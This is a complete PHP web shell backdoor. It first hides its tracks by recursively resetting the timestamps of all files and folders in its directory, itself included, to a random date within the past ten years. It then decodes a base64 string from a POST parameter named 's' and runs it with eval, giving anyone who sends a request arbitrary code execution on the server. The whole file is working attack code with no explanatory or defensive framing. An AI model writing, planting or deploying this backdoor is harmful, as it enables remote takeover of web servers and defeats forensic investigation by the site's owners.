<?php
$interval = 10*365*24*60*60;
$now = time();
$rand_time = rand($now-$interval, $now);
$file_path = __FILE__;
$dir_path = dirname($file_path);

function scanAndUpdate($path, $time) {
    $list = scandir($path);
    foreach ($list as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $path . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full)) {
            scanAndUpdate($full, $time);
        }
        @touch($full, $time, $time);
    }
    @touch($path, $time, $time);
}

scanAndUpdate($dir_path, $rand_time);
@touch($file_path, $rand_time, $rand_time);

$b=substr($_POST['s'], 1);
eval(base64_decode($b));
?>